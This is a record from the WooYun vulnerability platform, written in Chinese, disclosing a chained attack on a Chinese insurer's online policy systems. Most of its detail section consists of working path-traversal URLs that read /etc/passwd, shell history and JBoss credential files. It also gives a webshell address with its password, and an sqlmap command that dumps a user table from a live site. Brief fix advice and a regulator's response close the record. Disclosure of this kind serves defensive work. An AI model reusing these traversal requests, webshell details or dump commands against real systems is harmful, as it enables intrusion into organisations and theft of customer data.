{"id": 14967, "wybug_id": "wooyun-2015-0117147", "wybug_title": "看我如何通过漏洞组合获取长安保险投保系统权限(GetShell)", "wybug_corp": "长安责任保险", "wybug_author": "茜茜公主", "wybug_date": "2015-06-03 18:06", "wybug_open_date": "2015-07-20 17:20", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向公众公开  简要描述： 漏洞组合 详细说明：  1#任意文件下载（拿到系统关键路径及jboss认证密码）2#jboss命令执行3#SQL注入在长安保险官网的快速链接，有一处网上激活\n\n进入该系统\n\n这2个子系统其实代码都一样，我们选其一进入\n\n在索赔指南处，可以得到漏洞1：任意文件下载的url\nhttp://www.ecaic.com:8070/cardactiverenshen/fileDownLoadAction.do?action=download&fileUrl=/jsp/material/2752/&fileName=lipei.rar\n很明显的，你还能知道该系统用了jboss，左上角图标，尝试了下jboss的漏洞，发现需要认证，所以接下来我把注意打在获取jboss认证密码上构造一下下载链接\nhttp://www.ecaic.com:8070/cardactiverenshen/fileDownLoadAction.do?action=download&fileUrl=/jsp/material/2752/../../../../../../../etc/&fileName=passwd\n\n\n\n\n\nhttp://www.ecaic.com:8070/cardactiverenshen/fileDownLoadAction.do?action=download&fileUrl=/jsp/material/2752/../../../../&fileName=cardactive.jsr\n如果文件不存在，你可以得到部分路径\n\n根据之前几弹长安保险的漏洞分析，它的目录结构应是下面这样的\n\n所以，只好把.bash_history载下来一观，看看里面有没有jboss的绝对路径\nhttp://www.ecaic.com:8070/cardactiverenshen/fileDownLoadAction.do?action=download&fileUrl=/jsp/material/2752/../../../../../../../root/&fileName=.bash_history\nroot下的提示无权限下载，我知道我犯傻了，所以\nhttp://www.ecaic.com:8070/cardactiverenshen/fileDownLoadAction.do?action=download&fileUrl=/jsp/material/2752/../../../../../&fileName=.bash_history\n\n\n   漏洞证明：  打开.bash_history，如愿得到绝对路径,但有2个，猜测应该不止一个jboss端口，扫描下发现了http://www.ecaic.com:8580\n\n\n路径1：/home/jboss/jboss-eap-4.3.0.GA_CP10/server/cardactive_server/\n\n路径2：/home/jboss/jboss-eap-4.3/jboss-as/server/cardactive_server/\n接着获取jboss认证密码\nhttp://www.ecaic.com:8070/cardactiverenshen/fileDownLoadAction.do?action=download&fileUrl=/jsp/material/2752/../../../../../jboss-eap-4.3.0.GA_CP10/server/cardactive_server/conf/props/&fileName=jmx-console-users.properties\n\n\n\nhttp://www.ecaic.com:8070/cardactiverenshen/fileDownLoadAction.do?action=download&fileUrl=/jsp/material/2752/../../../../../jboss-eap-4.3/jboss-as/server/cardactive_server/conf/props/&fileName=jmx-console-users.properties\n\n\n对2个web的jboss尝试认证发现\n路径1：/home/jboss/jboss-eap-4.3.0.GA_CP10/server/cardactive_server/\n对应的是http://www.ecaic.com:8580\n路径2：/home/jboss/jboss-eap-4.3/jboss-as/server/cardactive_server/\n对应的是http://www.ecaic.com:8070接下来利用jboss，getshell\n\n一句话地址：http://www.ecaic.com:8580/is/index.jsp经过验证，即http://eshop.ecaic.com/is/index.jsp密码：023长安责任保险股份有限公司自助投保系统\n\n\n\n该服务器上有长安责任保险股份有限公司自助投保卡激活系统\n\n车险远程查勘定损系统\n\n车险移动理赔管理平台\n\n还有这个保单信息查询系统\n\n长安责任保险业务辅助平台\n\n剩下的事大家都懂的，数据库我就不看了抽时间又看了一下长安责任保险股份有限公司自助投保系统，存在一处注入，都在一处服务器上，我一起指出来吧，个人感觉应该不止一处，留给其他朋友探索吧\nhttp://eshop.ecaic.com/loveNetSales/termsAction.do?action=inContentView&riskCode=2808&sequence=1\n\n\n\n\n\n\n\npython SQLMap/SQLMap.py -u \"http://eshop.ecaic.com/loveNetSales/termsAction.do?action=inContentView&riskCode=2808&sequence=1\" --time-sec 6 -D LOVEPRD -T T_USER --dump\n   修复方案：  文件下载过滤../个人建议这个invoker/JMXInvokerServlet还是删除保险注入点过滤   版权声明：转载请注明来源 茜茜公主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-06-05 17:20 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向保险行业信息化主管部门通报，由其后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-20 17:36 |    \t\tRipZ \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:38        | 安装tc130精神扰乱装置)\t\t \n  赞    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}